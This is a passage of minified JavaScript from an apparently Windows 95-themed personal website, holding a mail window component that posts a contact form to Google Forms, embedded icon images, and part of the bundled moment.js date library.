    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAElBMVEUAAACAgIAAAAD//////wDAwMCfFoyPAAAAAXRSTlMAQObYZgAAAAFiS0dEAxEMTPIAAAAHdElNRQfiBhgXBTYmEU7QAAAAjElEQVQoz72R0Q3DIAxEswKJvEA3iCwPEJ0YAFnsv0rAxoSq3835y8fzgcy2vaO0am/GwY/QjbT0ZzdoQchGyuwvNUMCAcFDSyQouxEI8SAGcikG4UhLmEQuAM7KQUA7QqpBCLikVCFBtBOptSWoE7knWmUnFBxlTyeePST2MR0zngm/5WeFny/9599uplo1j43vrn4AAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDYtMjRUMjM6MDU6NTQtMDQ6MDAB8pOGAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTA2LTI0VDIzOjA1OjU0LTA0OjAwcK8rOgAAAABJRU5ErkJggg==",
  RA = rf("mail", {
    state: () => ({
      mailContent: "",
      mailSender: "",
      mailSubject: "New Message",
    }),
    actions: {
      setMailContent(e) {
        this.mailContent = e;
      },
      setMailSender(e) {
        this.mailSender = e;
      },
      setMailSubject(e) {
        this.mailSubject = e;
      },
      resetMail() {
        (this.mailContent = ""),
          (this.mailSender = ""),
          (this.mailSubject = "New Message");
      },
    },
  }),
  mn = (e) => (Bn("data-v-c22aeac7"), (e = e()), Jn(), e),
  CA = ["id"],
  WA = mn(() =>
    L(
      "iframe",
      {
        name: "hidden_iframe",
        id: "hidden_iframe",
        style: { display: "none" },
      },
      null,
      -1
    )
  ),
  GA = { class: "window-name" },
  FA = ["src", "alt"],
  LA = mn(() =>
    L(
      "span",
      {
        style: {
          height: "2px",
          width: "6px",
          background: "black",
          "margin-top": "8px",
          "margin-right": "2px",
        },
      },
      null,
      -1
    )
  ),
  jA = [LA],
  NA = mn(() =>
    L(
      "span",
      {
        style: {
          height: "8px",
          width: "9px",
          "border-left": "black 1px solid",
          "border-right": "black 1px solid",
          "border-bottom": "black 1px solid",
          "border-top": "black 2px solid",
        },
      },
      null,
      -1
    )
  ),
  BA = [NA],
  JA = Zt(
    '<div class="send-bar" data-v-c22aeac7><button type="submit" class="sent" style="z-index:10;" data-v-c22aeac7><span class="border-box" data-v-c22aeac7><img src="' +
      OA +
      '" class="icon-image" data-v-c22aeac7><p style="margin-top:2px;color:black;" data-v-c22aeac7>Send</p></span></button></div>',
    1
  ),
  zA = { class: "content" },
  YA = { class: "container-details" },
  UA = { class: "header" },
  HA = mn(() => L("hr", null, null, -1)),
  VA = mn(() =>
    L(
      "div",
      { class: "subject-container" },
      [
        L("p", { style: { margin: "8px" } }, "To:"),
        L("div", { class: "receipient" }, "Don"),
      ],
      -1
    )
  ),
  QA = mn(() => L("hr", null, null, -1)),
  XA = { class: "subject-container" },
  ZA = mn(() => L("p", { style: { margin: "8px" } }, "Subject:", -1)),
  qA = mn(() => L("hr", null, null, -1)),
  KA = { class: "from-container", style: { "margin-bottom": "2px" } },
  $A = mn(() => L("p", { style: { margin: "8px" } }, "From:", -1)),
  eb = {
    __name: "Mail",
    props: {
      windowId: String,
      nameOfWindow: String,
      content_padding_left: { required: !1, type: String, default: "15%" },
      content_padding_right: { required: !1, type: String, default: "15%" },
      content_padding_top: { required: !1, type: String, default: "5%" },
      content_padding_bottom: { required: !1, type: String, default: "5%" },
    },
    setup(e) {
      const t = e,
        n = Me({ x: 0, y: 0 }),
        o = Me({ x: 0, y: 0 }),
        i = Yn(),
        a = RA(),
        u = Me({}),
        f = t.nameOfWindow,
        p = Me(400),
        v = Me(400),
        y = co(() => ({
          height: `${v.value}px`,
          width: `${p.value}px`,
          transform: `translate(${n.value.x}px, ${n.value.y}px)`,
          "--content-padding-left": t.content_padding_left || "15%",
          "--content-padding-right": t.content_padding_right || "15%",
          "--content-padding-top": t.content_padding_top || "5%",
          "--content-padding-bottom": t.content_padding_bottom || "5%",
          "--fullscreen": i.getFullscreenWindowHeight,
        })),
        w = () => {
          i.setActiveWindow(u.value.windowId),
            i.zIndexIncrement(u.value.windowId);
        },
        x = () => {
          if (1 == i.getWindowFullscreen(u.value.windowId)) {
            const I = { fullscreen: !1, windowId: u.value.windowId };
            i.setFullscreen(I),
              (n.value.x = o.value.x),
              (n.value.y = o.value.y);
          } else if (0 == i.getWindowFullscreen(u.value.windowId)) {
            const I = { fullscreen: !0, windowId: u.value.windowId };
            i.setFullscreen(I);
            const W = n.value.x,
              M = n.value.y;
            (o.value.x = W), (o.value.y = M), (n.value.x = 0), (n.value.y = 0);
          }
        },
        k = () => {
          const I = { windowState: "minimize", windowId: u.value.windowId };
          i.setWindowState(I);
        },
        D = () => {
          const I = { windowState: "close", windowId: u.value.windowId };
          i.setWindowState(I);
        },
        G = (I) => {
          const W = `../assets/win95Icons/${I}`,
            U = Object.assign({
              "../assets/win95Icons/apple.png": jr,
              "../assets/win95Icons/apple2.png": Nr,
              "../assets/win95Icons/apple3.png": Br,
              "../assets/win95Icons/bio.png": Jr,
              "../assets/win95Icons/file.png": zr,
              "../assets/win95Icons/folder.png": Yr,
              "../assets/win95Icons/mail.png": Ur,
              "../assets/win95Icons/noss.webp": Hr,
              "../assets/win95Icons/photos.png": Vr,
              "../assets/win95Icons/resume.png": Qr,
            })[W];
          return null == U ? "" : U.default;
        },
        q = () => {
          setTimeout(() => {
            D(),
              a.setMailSubject(""),
              a.setMailSender(""),
              a.setMailContent(""),
              alert("Email Sent!");
          }, 500);
        },
        ie = (I) => {
          "" == I.target.value.replace(/\s/g, "")
            ? a.setMailSubject("New Message")
            : a.setMailSubject(I.target.value);
        },
        te = (I) => {
          "" == I.target.value.replace(/\s/g, "")
            ? a.setMailSender("")
            : a.setMailSender(I.target.value);
        },
        E = (I) => {
          "" == I.target.value.replace(/\s/g, "")
            ? a.setMailContent("")
            : a.setMailContent(I.target.value);
        };
      let C = !1;
      return (
        hn(() => {
          (u.value = i.getWindowById(f)),
            It("#" + u.value.windowId)
              .draggable({
                listeners: {
                  move(W) {
                    (n.value.x += W.dx), (n.value.y += W.dy);
                  },
                },
                modifiers: [
                  It.modifiers.restrictRect({
                    restriction: "#screen",
                    endOnly: !0,
                  }),
                ],
                allowFrom: "#top-bar",
              })
              .on("dragstart", () => {
                C = !0;
              })
              .on("dragmove", () => {
                C && (w(), (C = !1));
              })
              .on("dragend", () => {
                C = !1;
              })
              .resizable({
                edges: { left: !0, right: !0, bottom: !0, top: !1 },
                listeners: {
                  move(W) {
                    const M = W.target;
                    (p.value = W.rect.width),
                      (v.value = W.rect.height),
                      (M.style.width = `${p.value}px`),
                      (M.style.height = `${v.value}px`),
                      (n.value.x += W.deltaRect.left),
                      (n.value.y += W.deltaRect.top);
                  },
                },
                modifiers: [
                  It.modifiers.restrictSize({
                    min: { width: 400, height: 400 },
                    max: {
                      width:
                        document.getElementById("screen").clientWidth -
                        n.value.x,
                      height:
                        document.getElementById("screen").clientHeight -
                        n.value.y,
                    },
                  }),
                ],
              });
        }),
        (I, W) => (
          ve(),
          Ie(
            "div",
            {
              id: u.value.windowId,
              style: Pt(y.value),
              class: gt([
                "window window-style",
                {
                  fullscreen: 1 == u.value.fullscreen,
                  minimize: "minimize" == u.value.fullscreen,
                },
              ]),
              onClick: [w, w],
              onDragstart: w,
            },
            [
              WA,
              L(
                "form",
                {
                  onSubmit: q,
                  action:
                    "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdRBqHB0Z6GOjwE3jniX8-fHfJK-WcyzNTmkPFg4fg2SYPwpA/formResponse",
                  class: "window-style",
                  id: "container",
                  target: "hidden_iframe",
                },
                [
                  L(
                    "div",
                    {
                      id: "top-bar",
                      class: gt([
                        "top-bar-window",
                        De(i).activeWindow == u.value.windowId
                          ? "top-bar"
                          : "top-bar-deactivated",
                      ]),
                      onDblclick: x,
                    },
                    [
                      L("div", GA, [
                        L(
                          "img",
                          {
                            class: "icon-image",
                            src: G(u.value.iconImage),
                            alt: u.value.altText,
                          },
                          null,
                          8,
                          FA
                        ),
                        mi(xt(u.value.displayName), 1),
                      ]),
                      L("div", { class: "triple-button" }, [
                        L(
                          "button",
                          { class: "minimize-button button", onClick: k },
                          jA
                        ),
                        L(
                          "button",
                          { class: "expand-button button", onClick: x },
                          BA
                        ),
                        L(
                          "button",
                          {
                            class: "close-button button",
                            style: {
                              "margin-right": "3px",
                              "padding-left": "1px",
                            },
                            onClick: D,
                          },
                          " × "
                        ),
                      ]),
                    ],
                    34
                  ),
                  JA,
                  L("div", zA, [
                    L("div", YA, [
                      L("div", UA, xt(De(a).mailSubject), 1),
                      HA,
                      VA,
                      QA,
                      L("div", XA, [
                        ZA,
                        ks(
                          L(
                            "input",
                            {
                              name: "entry.609946071",
                              class: "subject",
                              "onUpdate:modelValue":
                                W[0] || (W[0] = (M) => (I.mailSubject = M)),
                              onInput: ie,
                              type: "text",
                              required: "true",
                            },
                            null,
                            544
                          ),
                          [[Ws, I.mailSubject]]
                        ),
                      ]),
                      qA,
                      L("div", KA, [
                        $A,
                        ks(
                          L(
                            "input",
                            {
                              name: "entry.367924729",
                              class: "subject",
                              "onUpdate:modelValue":
                                W[1] || (W[1] = (M) => (I.mailSender = M)),
                              onInput: te,
                              type: "email",
                              required: "true",
                            },
                            null,
                            544
                          ),
                          [[Ws, I.mailSender]]
                        ),
                      ]),
                    ]),
                    ks(
                      L(
                        "textarea",
                        {
                          name: "entry.863594021",
                          "onUpdate:modelValue":
                            W[2] || (W[2] = (M) => (I.mailContent = M)),
                          onInput: E,
                          required: "true",
                        },
                        null,
                        544
                      ),
                      [[Ws, I.mailContent]]
                    ),
                  ]),
                ],
                32
              ),
            ],
            46,
            CA
          )
        )
      );
    },
  },
  tb = Ot(eb, [["__scopeId", "data-v-c22aeac7"]]),
  iu = window.setInterval,
  nb =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAIVBMVEUAAAAAAACAAAD/AAAA/wAAgAAAAIAAAP///wCAgAD///8Zy0fQAAAAAXRSTlMAQObYZgAAAAFiS0dECmjQ9FYAAAAHdElNRQfiBhoAOBwkIrLGAAAAmUlEQVQoz7XRMQ7CMAwFUFsevNoMnMMiV+gFkDiIp+YKXdk4LnYiqEEdwdt/SuKvFuCvg6oqX3kIziw6J0Eyip6aLlfNs4KY0AKWAaAoAm+guBDvWAGL2HYAMqKES+y4DYBGZlDWgtFhj3PX7V579ICt9ngBzx5ewCP2HYCdOWGNHY8B0Nn9o4fzYY88rbXH+HClRx3BH//AJ8kFIO93liGNAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE4LTA2LTI2VDAwOjU2OjI4LTA0OjAwjfNqqgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOC0wNi0yNlQwMDo1NjoyOC0wNDowMPyu0hYAAAAASUVORK5CYII=",
  ob =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAFVBMVEUAAAC/vwAAAACAgIDAwMD//////wBeSt57AAAAAXRSTlMAQObYZgAAAAFiS0dEBfhv6ccAAAAHdElNRQfiBhgXES2C2lBpAAAAzElEQVQoz32RSxLCIAxAU3sCKnQtYPeM6AFsLQewhgsI3v8IUvqDzmgWzOTxJpAE4EdUp/Es17xouzFXK6Dnl0rz4tGgSnKg7xsOScXCPPsMUN8uQE2CnUGpZ8HLHlGBjveEfCxGUM4v3j1OYCrILENEoTeAI5BDsxm1tTYFnvnwSjf+XYcAZmpjTASz4ahzTuoNREOIfgEFIdFYAQgRFHldfxqCByPpBeBAzCXrFjjJ5xGUKp8Y8GM+06Dspg58txc4VLvNgdjt9k98AQS0M6MCJf0BAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE4LTA2LTI0VDIzOjE3OjQ1LTA0OjAwrlSXUQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOC0wNi0yNFQyMzoxNzo0NS0wNDowMN8JL+0AAAAASUVORK5CYII=";
var ff, va;
function ee() {
  return ff.apply(null, arguments);
}
function ib(e) {
  ff = e;
}
function Bt(e) {
  return (
    e instanceof Array || "[object Array]" === Object.prototype.toString.call(e)
  );
}
function io(e) {
  return null != e && "[object Object]" === Object.prototype.toString.call(e);
}
function Le(e, t) {
  return Object.prototype.hasOwnProperty.call(e, t);
}
function tl(e) {
  if (Object.getOwnPropertyNames)
    return 0 === Object.getOwnPropertyNames(e).length;
  var t;
  for (t in e) if (Le(e, t)) return !1;
  return !0;
}
function pt(e) {
  return void 0 === e;
}
function pn(e) {
  return (
    "number" == typeof e ||
    "[object Number]" === Object.prototype.toString.call(e)
  );
}
function _i(e) {
  return (
    e instanceof Date || "[object Date]" === Object.prototype.toString.call(e)
  );
}
function hf(e, t) {
  var o,
    n = [],
    i = e.length;
  for (o = 0; o < i; ++o) n.push(t(e[o], o));
  return n;
}
function Cn(e, t) {
  for (var n in t) Le(t, n) && (e[n] = t[n]);
  return (
    Le(t, "toString") && (e.toString = t.toString),
    Le(t, "valueOf") && (e.valueOf = t.valueOf),
    e
  );
}
function qt(e, t, n, o) {
  return Gf(e, t, n, o, !0).utc();
}
function rb() {
  return {
    empty: !1,
    unusedTokens: [],
    unusedInput: [],
    overflow: -2,
    charsLeftOver: 0,
    nullInput: !1,
    invalidEra: null,
    invalidMonth: null,
    invalidFormat: !1,
    userInvalidated: !1,
    iso: !1,
    parsedDateParts: [],
    era: null,
    meridiem: null,
    rfc2822: !1,
    weekdayMismatch: !1,
  };
}
function xe(e) {
  return null == e._pf && (e._pf = rb()), e._pf;
}
function nl(e) {
  var t = null,
    n = !1,
    o = e._d && !isNaN(e._d.getTime());
  return (
    o &&
      ((t = xe(e)),
      (n = va.call(t.parsedDateParts, function (i) {
        return null != i;
      })),
      (o =
        t.overflow < 0 &&
        !t.empty &&
        !t.invalidEra &&
        !t.invalidMonth &&
        !t.invalidWeekday &&
        !t.weekdayMismatch &&
        !t.nullInput &&
        !t.invalidFormat &&
        !t.userInvalidated &&
        (!t.meridiem || (t.meridiem && n))),
      e._strict &&
        (o =
          o &&
          0 === t.charsLeftOver &&
          0 === t.unusedTokens.length &&
          void 0 === t.bigHour)),
    null != Object.isFrozen && Object.isFrozen(e)
      ? o
      : ((e._isValid = o), e._isValid)
  );
}
function Xr(e) {
  var t = qt(NaN);
  return null != e ? Cn(xe(t), e) : (xe(t).userInvalidated = !0), t;
}
va = Array.prototype.some
  ? Array.prototype.some
  : function (e) {
      var o,
        t = Object(this),
        n = t.length >>> 0;
      for (o = 0; o < n; o++) if (o in t && e.call(this, t[o], o, t)) return !0;
      return !1;
    };
var ru = (ee.momentProperties = []),
  Ns = !1;
function ol(e, t) {
  var n,
    o,
    i,
    a = ru.length;
  if (
    (pt(t._isAMomentObject) || (e._isAMomentObject = t._isAMomentObject),
    pt(t._i) || (e._i = t._i),
    pt(t._f) || (e._f = t._f),
    pt(t._l) || (e._l = t._l),
    pt(t._strict) || (e._strict = t._strict),
    pt(t._tzm) || (e._tzm = t._tzm),
    pt(t._isUTC) || (e._isUTC = t._isUTC),
    pt(t._offset) || (e._offset = t._offset),
    pt(t._pf) || (e._pf = xe(t)),
    pt(t._locale) || (e._locale = t._locale),
    a > 0)
  )
    for (n = 0; n < a; n++) pt((i = t[(o = ru[n])])) || (e[o] = i);
  return e;
}
function xi(e) {
  ol(this, e),
    (this._d = new Date(null != e._d ? e._d.getTime() : NaN)),
    this.isValid() || (this._d = new Date(NaN)),
    !1 === Ns && ((Ns = !0), ee.updateOffset(this), (Ns = !1));
}
function Jt(e) {
  return e instanceof xi || (null != e && null != e._isAMomentObject);
}
function pf(e) {
  !1 === ee.suppressDeprecationWarnings &&
    typeof console < "u" &&
    console.warn &&
    console.warn("Deprecation warning: " + e);
}
function Rt(e, t) {
  var n = !0;
  return Cn(function () {
    if ((null != ee.deprecationHandler && ee.deprecationHandler(null, e), n)) {
      var i,
        a,
        u,
        o = [],
        f = arguments.length;
      for (a = 0; a < f; a++) {
        if (((i = ""), "object" == typeof arguments[a])) {
          for (u in ((i += "\n[" + a + "] "), arguments[0]))
            Le(arguments[0], u) && (i += u + ": " + arguments[0][u] + ", ");
          i = i.slice(0, -2);
        } else i = arguments[a];
        o.push(i);
      }
      pf(
        e +
          "\nArguments: " +
          Array.prototype.slice.call(o).join("") +
          "\n" +
          new Error().stack
      ),
        (n = !1);
    }
    return t.apply(this, arguments);
  }, t);
}
var wa,
  su = {};
function gf(e, t) {
  null != ee.deprecationHandler && ee.deprecationHandler(e, t),
    su[e] || (pf(t), (su[e] = !0));
}
function Kt(e) {
  return (
    (typeof Function < "u" && e instanceof Function) ||
    "[object Function]" === Object.prototype.toString.call(e)
  );
}
function sb(e) {
  var t, n;
  for (n in e)
    Le(e, n) && (Kt((t = e[n])) ? (this[n] = t) : (this["_" + n] = t));
  (this._config = e),
    (this._dayOfMonthOrdinalParseLenient = new RegExp(
      (this._dayOfMonthOrdinalParse.source || this._ordinalParse.source) +
        "|" +
        /\d{1,2}/.source
    ));
}
function ya(e, t) {
  var o,
    n = Cn({}, e);
  for (o in t)
    Le(t, o) &&
      (io(e[o]) && io(t[o])
        ? ((n[o] = {}), Cn(n[o], e[o]), Cn(n[o], t[o]))
        : null != t[o]
        ? (n[o] = t[o])
        : delete n[o]);
  for (o in e) Le(e, o) && !Le(t, o) && io(e[o]) && (n[o] = Cn({}, n[o]));
  return n;
}
function il(e) {
  null != e && this.set(e);
}
(ee.suppressDeprecationWarnings = !1),
  (ee.deprecationHandler = null),
  (wa = Object.keys
    ? Object.keys
    : function (e) {
        var t,
          n = [];
        for (t in e) Le(e, t) && n.push(t);
        return n;
      });
var ab = {
  sameDay: "[Today at] LT",
  nextDay: "[Tomorrow at] LT",
  nextWeek: "dddd [at] LT",
  lastDay: "[Yesterday at] LT",
  lastWeek: "[Last] dddd [at] LT",
  sameElse: "L",
};
function lb(e, t, n) {
  var o = this._calendar[e] || this._calendar.sameElse;
  return Kt(o) ? o.call(t, n) : o;
}
function Xt(e, t, n) {
  var o = "" + Math.abs(e),
    i = t - o.length;
  return (
    (e >= 0 ? (n ? "+" : "") : "-") +
    Math.pow(10, Math.max(0, i)).toString().substr(1) +
    o
  );
}
var rl =
    /(\[[^\[]*\])|(\\)?([Hh]mm(ss)?|Mo|MM?M?M?|Do|DDDo|DD?D?D?|ddd?d?|do?|w[o|w]?|W[o|W]?|Qo?|N{1,5}|YYYYYY|YYYYY|YYYY|YY|y{2,4}|yo?|gg(ggg?)?|GG(GGG?)?|e|E|a|A|hh?|HH?|kk?|mm?|ss?|S{1,9}|x|X|zz?|ZZ?|.)/g,
  Hi = /(\[[^\[]*\])|(\\)?(LTS|LT|LL?L?L?|l{1,4})/g,
  Bs = {},
  ko = {};
function fe(e, t, n, o) {
  var i = o;
  "string" == typeof o &&
    (i = function () {
      return this[o]();
    }),
    e && (ko[e] = i),
    t &&
      (ko[t[0]] = function () {
        return Xt(i.apply(this, arguments), t[1], t[2]);
      }),
    n &&
      (ko[n] = function () {
        return this.localeData().ordinal(i.apply(this, arguments), e);
      });
}
function cb(e) {
  return e.match(/\[[\s\S]/) ? e.replace(/^\[|\]$/g, "") : e.replace(/\\/g, "");
}
function ub(e) {
  var n,
    o,
    t = e.match(rl);
  for (n = 0, o = t.length; n < o; n++)
    ko[t[n]] ? (t[n] = ko[t[n]]) : (t[n] = cb(t[n]));
  return function (i) {
    var u,
      a = "";
    for (u = 0; u < o; u++) a += Kt(t[u]) ? t[u].call(i, e) : t[u];
    return a;
  };
}
function nr(e, t) {
  return e.isValid()
    ? ((t = mf(t, e.localeData())), (Bs[t] = Bs[t] || ub(t)), Bs[t](e))
    : e.localeData().invalidDate();
}
function mf(e, t) {
  var n = 5;
  function o(i) {
    return t.longDateFormat(i) || i;
  }
  for (Hi.lastIndex = 0; n >= 0 && Hi.test(e); )
    (e = e.replace(Hi, o)), (Hi.lastIndex = 0), (n -= 1);
  return e;
}
var db = {
  LTS: "h:mm:ss A",
  LT: "h:mm A",
  L: "MM/DD/YYYY",
  LL: "MMMM D, YYYY",
  LLL: "MMMM D, YYYY h:mm A",
  LLLL: "dddd, MMMM D, YYYY h:mm A",
};
function fb(e) {
  var t = this._longDateFormat[e],
    n = this._longDateFormat[e.toUpperCase()];
  return t || !n
    ? t
    : ((this._longDateFormat[e] = n
        .match(rl)
        .map(function (o) {
          return "MMMM" === o || "MM" === o || "DD" === o || "dddd" === o
            ? o.slice(1)
            : o;
        })
        .join("")),
      this._longDateFormat[e]);
}
var hb = "Invalid date";
function pb() {
  return this._invalidDate;
}
var gb = "%d",
  mb = /\d{1,2}/;
function vb(e) {
  return this._ordinal.replace("%d", e);
}
var yb = {
  future: "in %s",
  past: "%s ago",
  s: "a few seconds",
  ss: "%d seconds",
  m: "a minute",
  mm: "%d minutes",
  h: "an hour",
  hh: "%d hours",
  d: "a day",
  dd: "%d days",
  w: "a week",
  ww: "%d weeks",
  M: "a month",
  MM: "%d months",
  y: "a year",
  yy: "%d years",
};
function wb(e, t, n, o) {
  var i = this._relativeTime[n];
  return Kt(i) ? i(e, t, n, o) : i.replace(/%d/i, e);
}
function Ab(e, t) {
  var n = this._relativeTime[e > 0 ? "future" : "past"];
  return Kt(n) ? n(t) : n.replace(/%s/i, t);
}
var au = {
  D: "date",
  dates: "date",
  date: "date",
  d: "day",
  days: "day",
  day: "day",
  e: "weekday",
  weekdays: "weekday",
  weekday: "weekday",
  E: "isoWeekday",
  isoweekdays: "isoWeekday",
  isoweekday: "isoWeekday",
  DDD: "dayOfYear",
  dayofyears: "dayOfYear",
  dayofyear: "dayOfYear",
  h: "hour",
  hours: "hour",
  hour: "hour",
  ms: "millisecond",
  milliseconds: "millisecond",
  millisecond: "millisecond",
  m: "minute",
  minutes: "minute",
  minute: "minute",
  M: "month",
  months: "month",
  month: "month",
  Q: "quarter",
  quarters: "quarter",
  quarter: "quarter",
  s: "second",
  seconds: "second",
  second: "second",
  gg: "weekYear",
  weekyears: "weekYear",
  weekyear: "weekYear",
  GG: "isoWeekYear",
  isoweekyears: "isoWeekYear",
  isoweekyear: "isoWeekYear",
  w: "week",
  weeks: "week",
  week: "week",
  W: "isoWeek",
  isoweeks: "isoWeek",
  isoweek: "isoWeek",
  y: "year",
  years: "year",
  year: "year",
};
function Ct(e) {
  return "string" == typeof e ? au[e] || au[e.toLowerCase()] : void 0;
}
function sl(e) {
  var n,
    o,
    t = {};
  for (o in e) Le(e, o) && (n = Ct(o)) && (t[n] = e[o]);
  return t;
}
var bb = {
  date: 9,
  day: 11,
  weekday: 11,
  isoWeekday: 11,
  dayOfYear: 4,
  hour: 13,
  millisecond: 16,
  minute: 14,
  month: 8,
  quarter: 7,
  second: 15,
  weekYear: 1,
  isoWeekYear: 1,
  week: 5,
  isoWeek: 5,
  year: 1,
};
function _b(e) {
  var n,
    t = [];
  for (n in e) Le(e, n) && t.push({ unit: n, priority: bb[n] });
  return (
    t.sort(function (o, i) {
      return o.priority - i.priority;
    }),
    t
  );
}
var Ar,
  vf = /\d/,
  Mt = /\d\d/,
  yf = /\d{3}/,
  al = /\d{4}/,
  Zr = /[+-]?\d{6}/,
  Ue = /\d\d?/,
  wf = /\d\d\d\d?/,
  Af = /\d\d\d\d\d\d?/,
  qr = /\d{1,3}/,
  ll = /\d{1,4}/,
  Kr = /[+-]?\d{1,6}/,
  Lo = /\d+/,
  $r = /[+-]?\d+/,
  xb = /Z|[+-]\d\d:?\d\d/gi,
  es = /Z|[+-]\d\d(?::?\d\d)?/gi,
  Pb = /[+-]?\d+(\.\d{1,3})?/,
  Pi =
    /[0-9]{0,256}['a-z\u00A0-\u05FF\u0700-\uD7FF\uF900-\uFDCF\uFDF0-\uFF07\uFF10-\uFFEF]{1,256}|[\u0600-\u06FF\/]{1,256}(\s*?[\u0600-\u06FF]{1,256}){1,2}/i,
  jo = /^[1-9]\d?/,
  cl = /^([1-9]\d|\d)/;
function se(e, t, n) {
  Ar[e] = Kt(t)
    ? t
    : function (o, i) {
        return o && n ? n : t;
      };
}
function Mb(e, t) {
  return Le(Ar, e) ? Ar[e](t._strict, t._locale) : new RegExp(Sb(e));
}
function Sb(e) {
  return un(
    e
      .replace("\\", "")
      .replace(/\\(\[)|\\(\])|\[([^\]\[]*)\]|\\(.)/g, function (t, n, o, i, a) {
        return n || o || i || a;
      })
  );
}
function un(e) {
  return e.replace(/[-\/\\^$*+?.()|[\]{}]/g, "\\$&");
}
function kt(e) {
  return e < 0 ? Math.ceil(e) || 0 : Math.floor(e);
}
function Ee(e) {
  var t = +e,
    n = 0;
  return 0 !== t && isFinite(t) && (n = kt(t)), n;
}
Ar = {};
var Aa = {};
function Ne(e, t) {
  var n,
    i,
    o = t;
  for (
    "string" == typeof e && (e = [e]),
      pn(t) &&
        (o = function (a, u) {
          u[t] = Ee(a);
        }),
      i = e.length,
      n = 0;
    n < i;
    n++
  )
    Aa[e[n]] = o;
}
function Mi(e, t) {
  Ne(e, function (n, o, i, a) {
    (i._w = i._w || {}), t(n, i._w, i, a);
  });
}
function Tb(e, t, n) {
  null != t && Le(Aa, e) && Aa[e](t, n._a, n, e);
}
function ts(e) {
  return (e % 4 == 0 && e % 100 != 0) || e % 400 == 0;
}
var lt = 0,
  an = 1,
  Vt = 2,
  nt = 3,
  Lt = 4,
  ln = 5,
  eo = 6,
  kb = 7,
  Eb = 8;
function ii(e) {
  return ts(e) ? 366 : 365;
}
fe("Y", 0, 0, function () {
  var e = this.year();
  return e <= 9999 ? Xt(e, 4) : "+" + e;
}),
  fe(0, ["YY", 2], 0, function () {
    return this.year() % 100;
  }),
  fe(0, ["YYYY", 4], 0, "year"),
  fe(0, ["YYYYY", 5], 0, "year"),
  fe(0, ["YYYYYY", 6, !0], 0, "year"),
  se("Y", $r),
  se("YY", Ue, Mt),
  se("YYYY", ll, al),
  se("YYYYY", Kr, Zr),
  se("YYYYYY", Kr, Zr),
  Ne(["YYYYY", "YYYYYY"], lt),
  Ne("YYYY", function (e, t) {
    t[lt] = 2 === e.length ? ee.parseTwoDigitYear(e) : Ee(e);
  }),
  Ne("YY", function (e, t) {
    t[lt] = ee.parseTwoDigitYear(e);
  }),
  Ne("Y", function (e, t) {
    t[lt] = parseInt(e, 10);
  }),
  (ee.parseTwoDigitYear = function (e) {
    return Ee(e) + (Ee(e) > 68 ? 1900 : 2e3);
  });
var qe,
  bf = No("FullYear", !0);
function Db() {
  return ts(this.year());
}
function No(e, t) {
  return function (n) {
    return null != n
      ? (_f(this, e, n), ee.updateOffset(this, t), this)
      : ui(this, e);
  };
}
function ui(e, t) {
  if (!e.isValid()) return NaN;
  var n = e._d,
    o = e._isUTC;
  switch (t) {
    case "Milliseconds":
      return o ? n.getUTCMilliseconds() : n.getMilliseconds();
    case "Seconds":
      return o ? n.getUTCSeconds() : n.getSeconds();
    case "Minutes":
      return o ? n.getUTCMinutes() : n.getMinutes();
    case "Hours":
      return o ? n.getUTCHours() : n.getHours();
    case "Date":
      return o ? n.getUTCDate() : n.getDate();
    case "Day":
      return o ? n.getUTCDay() : n.getDay();
    case "Month":
      return o ? n.getUTCMonth() : n.getMonth();
    case "FullYear":
      return o ? n.getUTCFullYear() : n.getFullYear();
    default:
      return NaN;
  }
}
function _f(e, t, n) {
  var o, i, a, u, f;
  if (e.isValid() && !isNaN(n)) {
    switch (((o = e._d), (i = e._isUTC), t)) {
      case "Milliseconds":
        return void (i ? o.setUTCMilliseconds(n) : o.setMilliseconds(n));
      case "Seconds":
        return void (i ? o.setUTCSeconds(n) : o.setSeconds(n));
      case "Minutes":
        return void (i ? o.setUTCMinutes(n) : o.setMinutes(n));
      case "Hours":
        return void (i ? o.setUTCHours(n) : o.setHours(n));
      case "Date":
        return void (i ? o.setUTCDate(n) : o.setDate(n));
      case "FullYear":
        break;
      default:
        return;
    }
    (a = n),
      (u = e.month()),
      (f = 29 !== (f = e.date()) || 1 !== u || ts(a) ? f : 28),
      i ? o.setUTCFullYear(a, u, f) : o.setFullYear(a, u, f);
  }
}
function Ib(e) {
  return Kt(this[(e = Ct(e))]) ? this[e]() : this;
}
function Ob(e, t) {
  if ("object" == typeof e) {
    var o,
      n = _b((e = sl(e))),
      i = n.length;
    for (o = 0; o < i; o++) this[n[o].unit](e[n[o].unit]);
  } else if (Kt(this[(e = Ct(e))])) return this[e](t);
  return this;
}
function Rb(e, t) {
  return ((e % t) + t) % t;
}
function ul(e, t) {
  if (isNaN(e) || isNaN(t)) return NaN;
  var n = Rb(t, 12);
  return (e += (t - n) / 12), 1 === n ? (ts(e) ? 29 : 28) : 31 - ((n % 7) % 2);
}
(qe = Array.prototype.indexOf
  ? Array.prototype.indexOf
  : function (e) {
      var t;
      for (t = 0; t < this.length; ++t) if (this[t] === e) return t;
      return -1;
    }),
  fe("M", ["MM", 2], "Mo", function () {
    return this.month() + 1;
  }),
  fe("MMM", 0, 0, function (e) {
    return this.localeData().monthsShort(this, e);
  }),
  fe("MMMM", 0, 0, function (e) {
    return this.localeData().months(this, e);
  }),
  se("M", Ue, jo),
  se("MM", Ue, Mt),
  se("MMM", function (e, t) {
    return t.monthsShortRegex(e);
  }),
  se("MMMM", function (e, t) {
    return t.monthsRegex(e);
  }),
  Ne(["M", "MM"], function (e, t) {
